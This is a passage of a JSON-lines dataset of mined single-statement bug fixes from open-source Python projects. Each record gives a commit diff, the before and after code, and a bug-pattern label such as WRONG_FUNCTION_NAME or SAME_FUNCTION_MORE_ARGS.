{"project": "openstates", "commit_sha": "5d2b40c4e00fb6f345c298fbdf3eb82773708a46", "parent_sha": "e49e95b12d3142e5d042ab9eb5636e592a9e7dac", "file_path": "openstates/ny/events.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -36,7 +36,7 @@ class NYEventScraper(EventScraper):\n                \"%2526initiative%3DAll\")\n \n         with self.urlopen(url) as page:\n-            cal = icalendar.Calendar.from_string(page)\n+            cal = icalendar.Calendar.from_ical(page)\n \n             for comp in cal.walk():\n                 if comp.name != 'VEVENT':\n", "before": "cal = icalendar . Calendar . from_string ( page )", "after": "cal = icalendar . Calendar . from_ical ( page )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:from_string\", 3, 38, 3, 49], \"from_ical\"]]"}
{"project": "openstates", "commit_sha": "93add3a3c5b41f9f556de70b37fb753aab8c98cf", "parent_sha": "54a2106d9820bd86ac1afe9e0f6036a55cd90cae", "file_path": "openstates/in/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class INBillScraper(BillScraper):\n             page.make_links_absolute(url)\n \n             # check for Bill Withdrawn header\n-            h1text = page.get('//h1/text()')\n+            h1text = page.xpath('//h1/text()')\n             if h1text and h1text[0] == 'Bill Withdrawn':\n                 return\n \n", "before": "h1text = page . get ( '//h1/text()' )", "after": "h1text = page . xpath ( '//h1/text()' )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:get\", 3, 27, 3, 30], \"xpath\"]]"}
{"project": "openstates", "commit_sha": "c877172b0d4bdbfe55ade8539aef3c2890ca1160", "parent_sha": "d18507cceb4bd1206ffbee21d20c34ba50778e4d", "file_path": "openstates/hi/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -149,7 +149,7 @@ class HIBillScraper(BillScraper):\n                     action_params['action'] = cells[2].xpath('font')[0].text\n                     action_date = cells[0].xpath('font')[0].text\n                     action_params['date'] = datetime.strptime(action_date, \"%m/%d/%Y\")\n-                    action_params['type'] = classify_action(action_params['action'])\n+                    action_params['type'] = categorize_action(action_params['action'])\n                     actions.append(action_params)\n             for action_params in actions:\n                 bill.add_action(**action_params)\n", "before": "action_params [ 'type' ] = classify_action ( action_params [ 'action' ] )", "after": "action_params [ 'type' ] = categorize_action ( action_params [ 'action' ] )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:classify_action\", 3, 45, 3, 60], \"categorize_action\"]]"}
{"project": "spyne", "commit_sha": "b4ad317bfd0291efbdfb10a77c98126d12ca22ad", "parent_sha": "f2277965a3bdbfc3c8debff0cc993a2cbc78d335", "file_path": "src/rpclib/test/interop/_test_client_base.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -126,7 +126,7 @@ class RpclibClientTestBase(object):\n         self.assertEquals(ret, val)\n \n     def test_any_as_dict(self):\n-        val=self.__get_xml_test_val()\n+        val=self._get_xml_test_val()\n         ret = self.client.service.echo_any_as_dict(val)\n \n         self.assertEquals(ret, val)\n", "before": "val = self . __get_xml_test_val ( )", "after": "val = self . _get_xml_test_val ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:__get_xml_test_val\", 3, 18, 3, 36], \"_get_xml_test_val\"]]"}
{"project": "spyne", "commit_sha": "458d52cb0cd7f059493274bcd5efa8eb5c826fea", "parent_sha": "bdd53f6597b233bf6229caf299fcec8fb7bbafb7", "file_path": "src/rpclib/test/test_sqla.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ class TestSqlAlchemy(unittest.TestCase):\n                 }\n \n                 cls._mapper = mapper(cls, cls._main_t,\n-                    include_properties=cls._properties.keys(),\n+                    include_properties=cls._properties.values(),\n                     properties=cls._properties,\n                     primary_key=[address_t.c.id]\n                 )\n", "before": "cls . _mapper = mapper ( cls , cls . _main_t , include_properties = cls . _properties . keys ( ) , properties = cls . _properties , primary_key = [ address_t . c . id ] )", "after": "cls . _mapper = mapper ( cls , cls . _main_t , include_properties = cls . _properties . values ( ) , properties = cls . _properties , primary_key = [ address_t . c . id ] )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:keys\", 3, 56, 3, 60], \"values\"]]"}
{"project": "spyne", "commit_sha": "5bae48e45cc28177f4ce9e091b3ae4d9018f3059", "parent_sha": "6c3ed73f46ed3011519dd3fbc248a832ed3e2453", "file_path": "src/soaplib/wsgi_soap.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -325,7 +325,7 @@ class WSGISoapApp(object):\n                 faultcode, detail), encoding=string_encoding)\n             logging.debug(faultStr)\n \n-            self.onException(environ, e, faultStr)\n+            self.on_exception(environ, e, faultStr)\n             reset_request()\n \n             # initiate the response\n", "before": "self . onException ( environ , e , faultStr )", "after": "self . on_exception ( environ , e , faultStr )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:onException\", 3, 18, 3, 29], \"on_exception\"]]"}
{"project": "TreeNote", "commit_sha": "12bbf35245b55731be0f2182df88e565a327c820", "parent_sha": "522e21f520236634fe724f04f83b7e7696d9da1b", "file_path": "model.py", "project_url": "https://github.com/project-renard-survey/TreeNote", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1033,7 +1033,7 @@ class AutoCompleteEdit(QPlainTextEdit):\n         before_tag = self.toPlainText()[:self.textCursor().position() - len(self._completer.completionPrefix())]\n         after_tag = self.toPlainText()[self.textCursor().position():]\n         until_cursor = before_tag + completion + ' '\n-        self.setText(until_cursor + after_tag)\n+        self.setPlainText(until_cursor + after_tag)\n         cursor = self.textCursor()\n         cursor.setPosition(len(until_cursor))\n         self.setTextCursor(cursor)\n", "before": "self . setText ( until_cursor + after_tag )", "after": "self . setPlainText ( until_cursor + after_tag )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:setText\", 3, 14, 3, 21], \"setPlainText\"]]"}
{"project": "openstates", "commit_sha": "5f14cf69bdae1653ddb9d035b5638aae7c994fbb", "parent_sha": "476cf1e8779f7143120bb0370923036925ff8d7d", "file_path": "openstates/ok/bills.py", "project_url": "https://github.com/opencouncil/openstates", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -78,7 +78,7 @@ class OKBillScraper(BillScraper):\n             bill_id = link.text.strip()\n             bill_num = int(re.findall('\\d+', bill_id)[0])\n             if bill_num >= 9900:\n-                self.info('skipping likely bad bill %s' % bill_id)\n+                self.log('skipping likely bad bill %s' % bill_id)\n                 continue\n             self.scrape_bill(chamber, session, bill_id, link.attrib['href'])\n \n", "before": "self . info ( 'skipping likely bad bill %s' % bill_id )", "after": "self . log ( 'skipping likely bad bill %s' % bill_id )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 22, 3, 26], \"log\"]]"}
{"project": "spyne", "commit_sha": "604201a821070395c84f9205e561a2be1a8f19f9", "parent_sha": "ccb1b45b20f330daf223dd867657424c662ccd25", "file_path": "src/rpclib/interface/_base.py", "project_url": "https://github.com/duixteam/spyne", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class InterfaceBase(object):\n                                                os.__module__, os.__name__,\n                                 ))\n \n-        logger.info(\"From this point on, you're not supposed to make any changes \"\n+        logger.debug(\"From this point on, you're not supposed to make any changes \"\n                     \"to the class & method structure of the exposed services.\")\n \n     tns = property(get_tns)\n", "before": "logger . info ( \"From this point on, you're not supposed to make any changes \" \"to the class & method structure of the exposed services.\" )", "after": "logger . debug ( \"From this point on, you're not supposed to make any changes \" \"to the class & method structure of the exposed services.\" )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 16, 3, 20], \"debug\"]]"}
{"project": "androguard", "commit_sha": "edc092fcff4873c4df1d40328f7bf4da03128af9", "parent_sha": "462ddfcbdc59a08f84e77bded0cf78a0566cfbf1", "file_path": "androguard/decompiler/dad/dataflow.py", "project_url": "https://github.com/Ever-Never/androguard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -198,7 +198,7 @@ def clear_path(graph, reg, loc1, loc2):\n     path = build_path(graph, node1, node2)\n     for node in path:\n         locs = node.ins_range\n-        if not clear_path_node(graph, reg, locs[0], min(loc2, locs[1])):\n+        if not clear_path_node(graph, reg, locs[0], max(loc2, locs[1])):\n             return False\n     return True\n \n", "before": "if not clear_path_node ( graph , reg , locs [ 0 ] , min ( loc2 , locs [ 1 ] ) ) : return False", "after": "if not clear_path_node ( graph , reg , locs [ 0 ] , max ( loc2 , locs [ 1 ] ) ) : return False", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:min\", 3, 53, 3, 56], \"max\"]]"}
{"project": "SwEng401WheelOfJeopardy", "commit_sha": "114833693ab4cc3d119b4482ac1254c46752f4ef", "parent_sha": "c76acc7ee3ec5f7066f20bd15e7d438bfa3e6e72", "file_path": "wheelofjeopardy/utils/read_configs.py", "project_url": "https://github.com/1amBulletproof/SwEng401WheelOfJeopardy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ def ReadCfgToOptions(cfgFile = \"Options.ini\"):\n     startScores = [None for x in range(nPlayers)]\n     for n in range(nPlayers):\n         playerNames[n] = cp.get(sec, 'name'+str(n+1) )\n-        startScores[n] = cp.get(sec, 'startScore'+str(n+1))\n+        startScores[n] = cp.getint(sec, 'startScore'+str(n+1))\n \n     # Parse [board] section\n     sec = 'board'\n", "before": "startScores [ n ] = cp . get ( sec , 'startScore' + str ( n + 1 ) )", "after": "startScores [ n ] = cp . getint ( sec , 'startScore' + str ( n + 1 ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:get\", 3, 29, 3, 32], \"getint\"]]"}
{"project": "SwEng401WheelOfJeopardy", "commit_sha": "97f0b760af195c0eb7a0d4c490571f5b017dfc06", "parent_sha": "ee7d916443eca55b0a03bea2ae23c1dd16d0866c", "file_path": "wheelofjeopardy/utils/read_configs.py", "project_url": "https://github.com/1amBulletproof/SwEng401WheelOfJeopardy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ def ReadCfgToOptions(cfgFile = \"Options.ini\"):\n     startScores = [None for x in range(nPlayers)]\n     for n in range(nPlayers):\n         playerNames[n] = cp.get(sec, 'name'+str(n+1) )\n-        startScores[n] = cp.get(sec, 'startScore'+str(n+1))\n+        startScores[n] = cp.getint(sec, 'startScore'+str(n+1))\n \n     # Parse [board] section\n     sec = 'board'\n", "before": "startScores [ n ] = cp . get ( sec , 'startScore' + str ( n + 1 ) )", "after": "startScores [ n ] = cp . getint ( sec , 'startScore' + str ( n + 1 ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:get\", 3, 29, 3, 32], \"getint\"]]"}
{"project": "nci-webtools-dceg-linkage", "commit_sha": "f62955436168d24b023293dbcd8a2041e7ae08b2", "parent_sha": "13c04bfea3f1dc0e6045f75485315e99df6d0b21", "file_path": "LDlink/LDtrait.py", "project_url": "https://github.com/CBIIT/nci-webtools-dceg-linkage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -679,7 +679,7 @@ def calculate_trait(snplst, pop, request, web, r2_d, r2_d_threshold=0.1):\n         \t\n     # print(\"ldInfo\", ldInfo)\t\n     for snp_coord in snp_coords:\t\n-        (matched_snps, problematic_snps) = get_gwas_fields(snp_coord[0], snp_coord[1], snp_coord[2], found, pops, pop_ids, ldInfo)\t\n+        (matched_snps, problematic_snps) = get_gwas_fields(snp_coord[0], snp_coord[1], snp_coord[2], found, pops, pop_ids, ldInfo, r2_d, r2_d_threshold)\t\n         details[snp_coord[0]] = {\t\n             \"aaData\": matched_snps\n         }\n", "before": "( matched_snps , problematic_snps ) = get_gwas_fields ( snp_coord [ 0 ] , snp_coord [ 1 ] , snp_coord [ 2 ] , found , pops , pop_ids , ldInfo )", "after": "( matched_snps , problematic_snps ) = get_gwas_fields ( snp_coord [ 0 ] , snp_coord [ 1 ] , snp_coord [ 2 ] , found , pops , pop_ids , ldInfo , r2_d , r2_d_threshold )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 59, 3, 131], [\",:,\", \"T\"], 14], [\"Insert\", [\"argument_list\", 3, 59, 3, 131], [\"identifier:r2_d\", \"T\"], 15], [\"Insert\", [\"argument_list\", 3, 59, 3, 131], [\",:,\", \"T\"], 16], [\"Insert\", [\"argument_list\", 3, 59, 3, 131], [\"identifier:r2_d_threshold\", \"T\"], 17]]"}
{"project": "course-management", "commit_sha": "a966be22e2699ff77af8a5aa1e2b90cdae5def52", "parent_sha": "3fb11aff970fe5a5fb19ec79f955fc6bc0d4631c", "file_path": "course/views/subject.py", "project_url": "https://github.com/fsr/course-management", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def course_overview(request, subjectname):\n             active_subject.course_set.filter(archiving='t')\n         )\n     else:\n-        cl = active_subject.course_set.filter(active=True)\n+        cl = active_subject.course_set.filter(active=True, archiving='t')\n \n     return render(\n         request,\n", "before": "cl = active_subject . course_set . filter ( active = True )", "after": "cl = active_subject . course_set . filter ( active = True , archiving = 't' )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 59], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 46, 3, 59], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:archiving\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'t'\", \"T\"], 2]]"}
{"project": "course-management", "commit_sha": "7456dddb713b4afd1c7cd9029910e82e4f3b966f", "parent_sha": "2f78f5ea10803e60f82e033af8ff438c6cb69749", "file_path": "user/views/verify.py", "project_url": "https://github.com/fsr/course-management", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ def verify_student_form(request):\n                 a.user = request.user\n                 a.save()\n             zih_mail = a.make_zih_mail()\n-            verification_mail(a.user, 'student', zih_mail)\n+            verification_mail(a.user, 'student', zih_mail, request)\n             return render(\n                 request,\n                 'registration/sent-student-verification-mail.html',\n", "before": "verification_mail ( a . user , 'student' , zih_mail )", "after": "verification_mail ( a . user , 'student' , zih_mail , request )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 59], [\",:,\", \"T\"], 6], [\"Insert\", [\"argument_list\", 3, 30, 3, 59], [\"identifier:request\", \"T\"], 7]]"}
{"project": "weblyzard_api", "commit_sha": "43003b9b58ba09f6398a839081b000bbcd744065", "parent_sha": "d2399e07dedf77dab1d37abb73a7692335ed7aef", "file_path": "src/python/weblyzard_api/model/__init__.py", "project_url": "https://github.com/weblyzard/weblyzard_api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -281,7 +281,7 @@ class Sentence(object):\n             result = []\n             deps = self.dependency.strip().split(' ')\n             for index, dep in enumerate(deps):\n-                [parent, label] = dep.split(':') if ':' in dep else [dep, None]\n+                [parent, label] = dep.split(':', 1) if ':' in dep else [dep, None]\n                 result.append(LabeledDependency(parent,\n                                                 self.pos_tags_list[index],\n                                                 label))\n", "before": "[ parent , label ] = dep . split ( ':' ) if ':' in dep else [ dep , None ]", "after": "[ parent , label ] = dep . split ( ':' , 1 ) if ':' in dep else [ dep , None ]", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 44, 3, 49], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 44, 3, 49], [\"integer:1\", \"T\"], 3]]"}
{"project": "macsyfinder", "commit_sha": "a6a90acd76d1b512d07cc89aa40afbde87438a2a", "parent_sha": "c2dabf1d2eb7983d0f4fe00f8273a08e5b4d1052", "file_path": "tests/test_serialization.py", "project_url": "https://github.com/gem-pasteur/macsyfinder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,7 +165,7 @@ neutral genes:\n         gene_sctj = ModelGene(c_gene_sctj, model)\n         model.add_accessory_gene(gene_sctj)\n         c_gene_sctn = CoreGene(self.model_location, \"sctN\", self.profile_factory)\n-        gene_sctn = ModelGene(c_gene_sctn, model)\n+        gene_sctn = ModelGene(c_gene_sctn, model, loner=True)\n         c_gene_sctn_flg = CoreGene(self.model_location, \"sctN_FLG\", self.profile_factory)\n         gene_sctn_flg = Exchangeable(c_gene_sctn_flg, gene_sctn)\n         gene_sctn.add_exchangeable(gene_sctn_flg)\n", "before": "gene_sctn = ModelGene ( c_gene_sctn , model )", "after": "gene_sctn = ModelGene ( c_gene_sctn , model , loner = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 50], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 30, 3, 50], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:loner\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "OldSeleniumLibrary", "commit_sha": "65213fdc0fa7aacf29d098c1ff0a8df0ad218d93", "parent_sha": "728ea1e581b31647944a239d8ce197f4cd863910", "file_path": "src/SeleniumLibrary/browser.py", "project_url": "https://github.com/robotframework/OldSeleniumLibrary", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class Browser(RunOnFailure):\n     def go_to(self, url):\n         \"\"\"Navigates the active browser instance to the provided URL.\"\"\"\n         self._info(\"Opening url '%s'\" % url)\n-        self._selenium.open(url)\n+        self._selenium.open(url, ignoreResponseCode=True)\n \n     def wait_until_page_loaded(self, timeout=None):\n", "before": "self . _selenium . open ( url )", "after": "self . _selenium . open ( url , ignoreResponseCode = True )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 33], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 28, 3, 33], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:ignoreResponseCode\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"true:True\", \"T\"], 2]]"}
{"project": "sweettooth", "commit_sha": "1d8c8e9b958c140cf51b5b9893d9c6ed03707ada", "parent_sha": "6717048a42d1c9f8092acd158a15a4e66fd78130", "file_path": "sweettooth/extensions/search.py", "project_url": "https://github.com/magcius/sweettooth", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ def enquire(querystring, versions=None):\n     qp.set_stemmer(xapian.Stem(\"en\"))\n     qp.set_database(db)\n \n-    query = qp.parse_query(querystring)\n+    query = qp.parse_query(querystring, qp.FLAG_PARTIAL)\n \n     if versions:\n         query = xapian.Query(xapian.Query.OP_FILTER,\n", "before": "query = qp . parse_query ( querystring )", "after": "query = qp . parse_query ( querystring , qp . FLAG_PARTIAL )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 40], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 27, 3, 40], [\"attribute\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:qp\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:FLAG_PARTIAL\", \"T\"], 2]]"}
{"project": "pants", "commit_sha": "d57920bbf7f23b1df9fa392d71e12567d7fbfa0f", "parent_sha": "95bc480a42bc9ec7693cfef5709500129da0976b", "file_path": "src/python/pants/goal/run_tracker.py", "project_url": "https://github.com/square/pants", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -222,7 +222,7 @@ class RunTracker(object):\n     \"\"\"Send timing results to URL specified in pants.ini\"\"\"\n     def error(msg):\n       # Report aleady closed, so just print error.\n-      print(\"WARNING: Failed to upload stats to %s due to %s\" % (self.stats_url, msg))\n+      print(\"WARNING: Failed to upload stats to %s due to %s\" % (self.stats_url, msg), file=sys.stderr)\n \n     if self.stats_url:\n       params = {\n", "before": "print ( \"WARNING: Failed to upload stats to %s due to %s\" % ( self . stats_url , msg ) )", "after": "print ( \"WARNING: Failed to upload stats to %s due to %s\" % ( self . stats_url , msg ) , file = sys . stderr )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 12, 3, 87], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 12, 3, 87], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:file\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:sys\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:stderr\", \"T\"], 2]]"}
{"project": "regulations-site", "commit_sha": "273c42f1fc094d033fa38ac549b378bbaa94d901", "parent_sha": "2b6995a8324ae5c51cebfc69593b499c422e042f", "file_path": "regserver/regulations/generator/generator.py", "project_url": "https://github.com/eregs/regulations-site", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -159,7 +159,7 @@ def get_all_section_layers(regulation, version):\n \n def get_all_layers(regulation, version):\n     \"\"\" Return the three layer appliers with the available layers possible \"\"\"\n-    creator = get_creator_all_section_layers()\n+    creator = get_creator_all_section_layers(regulation, version)\n     creator.add_layers([LayerCreator.TOC, LayerCreator.INTERNAL], regulation, version)\n     return creator.get_appliers()\n \n", "before": "creator = get_creator_all_section_layers ( )", "after": "creator = get_creator_all_section_layers ( regulation , version )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 45, 3, 47], [\"identifier:regulation\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 45, 3, 47], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 45, 3, 47], [\"identifier:version\", \"T\"], 3]]"}
{"project": "databroker", "commit_sha": "ee043ef6ef316bbf055bbed786d51041f23c2712", "parent_sha": "87595ada0a0950d657b10839e88b91b6e263c12c", "file_path": "metadatastore/document.py", "project_url": "https://github.com/bluesky/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class Document(MutableMapping):\n         try:\n             return getattr(self, key)\n         except AttributeError:\n-            raise KeyError()\n+            raise KeyError(key)\n \n     def __delitem__(self, key):\n         delattr(self, key)\n", "before": "raise KeyError ( )", "after": "raise KeyError ( key )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 29], [\"identifier:key\", \"T\"], 1]]"}
{"project": "databroker", "commit_sha": "05a39ca0831d4a4bf2049d1764d8333ec06a9f9d", "parent_sha": "943fc5504d1116f28b7765a4d59c814a74b5a164", "file_path": "databroker/tests/conftest.py", "project_url": "https://github.com/bluesky/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ def build_pymongo_backed_broker(request):\n     db_name = \"mds_testing_disposable_{}\".format(str(uuid.uuid4()))\n     test_conf = dict(database=db_name, host='localhost',\n                      port=27017, timezone='US/Eastern')\n-    mds = MDS(test_conf, 1)\n+    mds = MDS(test_conf, 1, auth=False)\n \n     def delete_mds():\n         print(\"DROPPING DB\")\n", "before": "mds = MDS ( test_conf , 1 )", "after": "mds = MDS ( test_conf , 1 , auth = False )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 14, 3, 28], [\",:,\", \"T\"], 4], [\"Insert\", [\"argument_list\", 3, 14, 3, 28], [\"keyword_argument\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:auth\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"false:False\", \"T\"], 2]]"}
{"project": "databroker", "commit_sha": "2cbde92461034b12dc2ce7165b92b32144b7ff59", "parent_sha": "171c98543d7a06deee2d8518e54d4709653880b3", "file_path": "databroker/_core.py", "project_url": "https://github.com/bluesky/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -959,7 +959,7 @@ def lookup_config(name):\n         tried.append(filename)\n         if os.path.isfile(filename):\n             with open(filename) as f:\n-                return yaml.load(f)\n+                return yaml.load(f, Loader=yaml.FullLoader)\n     else:\n         raise FileNotFoundError(\"No config file named {!r} could be found in \"\n                                 \"the following locations:\\n{}\"\n", "before": "return yaml . load ( f )", "after": "return yaml . load ( f , Loader = yaml . FullLoader )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 36], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 33, 3, 36], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:Loader\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:yaml\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:FullLoader\", \"T\"], 2]]"}
{"project": "openbci", "commit_sha": "43167bf225a8f23e1372d217a16e0b9a843fda9a", "parent_sha": "61e963fd49d8f375c5294ace28755d8b328454f9", "file_path": "gui/frontend/modules/ugm/ugm_module_dock_widget.py", "project_url": "https://github.com/BrainTech/openbci", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class UGMModuleDockWidget(QtGui.QDockWidget):\n         #     \n         # # Everything done :) All that is left is to establish connection if needed...\n         if not self._connection:\n-            self._connection = connect_client(type = peers.LOGIC_DECISION)\n+            self._connection = connect_client(type = peers.LOGIC_DECISION, addresses=settings.MULTIPLEXER_ADDRESSES)\n          # ...and send message to UGM\n         self._connection.send_message(\n             message = l_msg.SerializeToString(), \n", "before": "self . _connection = connect_client ( type = peers . LOGIC_DECISION )", "after": "self . _connection = connect_client ( type = peers . LOGIC_DECISION , addresses = settings . MULTIPLEXER_ADDRESSES )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 46, 3, 75], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 46, 3, 75], [\"keyword_argument\", \"N0\"], 3], [\"Insert\", \"N0\", [\"identifier:addresses\", \"T\"], 0], [\"Insert\", \"N0\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:settings\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:MULTIPLEXER_ADDRESSES\", \"T\"], 2]]"}
{"project": "pcircle", "commit_sha": "a388459b235549e01359cddf49a3e35406007438", "parent_sha": "97968a1a613d0d6686710a01b9f09652ba3d9520", "file_path": "circle.py", "project_url": "https://github.com/olcf/pcircle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -222,7 +222,7 @@ class Circle:\n         # barrier is complete, send messages to children if any and return true\n         if complete:\n             for child in self.child_ranks:\n-                self.comm.send(dest=child, tag = T.BARRIER)\n+                self.comm.send(None, dest=child, tag = T.BARRIER)\n \n             # reset state for another barrier\n             self.barrier_started = False\n", "before": "self . comm . send ( dest = child , tag = T . BARRIER )", "after": "self . comm . send ( None , dest = child , tag = T . BARRIER )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 60], [\"none:None\", \"T\"], 1], [\"Insert\", [\"argument_list\", 3, 31, 3, 60], [\",:,\", \"T\"], 2]]"}
{"project": "pcircle", "commit_sha": "24129add4793f28e7dab984af59ab71cb0b0b799", "parent_sha": "299b2f732d080870f3f933b245bc966474b0885f", "file_path": "pcircle/fcp.py", "project_url": "https://github.com/olcf/pcircle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -359,7 +359,7 @@ class FCP(BaseTask):\n                 try:\n                     os.unlink(dest)\n                 except:\n-                    logger.error(\"Failed to unlink %s, skipping ... \" % dest)\n+                    logger.error(\"Failed to unlink %s, skipping ... \" % dest, extra=self.d)\n                     return False\n                 else:\n                     wfd = self.do_open(dest, self.wfd_cache, os.O_WRONLY)\n", "before": "logger . error ( \"Failed to unlink %s, skipping ... \" % dest )", "after": "logger . error ( \"Failed to unlink %s, skipping ... \" % dest , extra = self . d )", "sstub_pattern": "SAME_FUNCTION_MORE_ARGS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 33, 3, 78], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 33, 